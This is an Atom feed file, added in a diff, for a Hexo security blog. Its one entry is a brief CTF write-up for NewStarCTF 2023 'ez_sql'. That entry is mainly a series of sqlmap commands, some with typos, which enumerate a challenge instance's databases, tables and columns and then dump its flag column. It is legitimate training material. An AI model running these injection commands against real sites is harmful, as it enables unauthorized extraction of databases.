@@ -1,0 +1,107 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;sqlmap使用&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-11-10T08:03:42.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="利用.htaccess构成后门" />
+    <category term="通过php_value来设置preg_macth正则回溯次数" />
+    <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="mysql" />
+    <category term="信息搜集（js，网络）" />
+    <category term="异或" />
+    <category term="密码爆破" />
+    <category term="sqlmap使用" />
+    <category term="SQL注入" />
+    <category term="文件包含" />
+    <entry>
+        <id>http://odiws.github.io/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/</id>
+        <title>[NewStarCTF-2023-公开赛道]ez_sql</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/"/>
+        <content type="html">&lt;h3 id=&#34;newstarctf-2023-公开赛道ez_sql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#newstarctf-2023-公开赛道ez_sql&#34;&gt;#&lt;/a&gt; [NewStarCTF-2023 - 公开赛道] ez_sql&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411101612107.png&#34; alt=&#34;image-20241110161232932&#34;&gt;&lt;/p&gt;
+&lt;p&gt;sqlmap 直接注入就行了（还得配合一下盲注）&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;--dbs&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--clomns&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-tables&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; here_is_flag &lt;span class=&#34;token parameter variable&#34;&gt;--clomns&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; here_is_flag &lt;span class=&#34;token parameter variable&#34;&gt;--columns&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; http://87173586-d547-42ca-a61c-7aaa6c3d70a2.node4.buuoj.cn:81/?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;TMP11503 &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctf &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; here_is_flag &lt;span class=&#34;token parameter variable&#34;&gt;-C&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--dump&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411101614986.png&#34; alt=&#34;image-20241110161434804&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzczNzI4MjY4L2FydGljbGUvZGV0YWlscy8xMzQyMDA2MzU=&#34;&gt;https://blog.csdn.net/m0_73728268/article/details/134200635&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="sqlmap使用" />
+        <category term="SQL注入" />
+        <updated>2024-11-10T08:03:42.000Z</updated>
+    </entry>
+</feed>
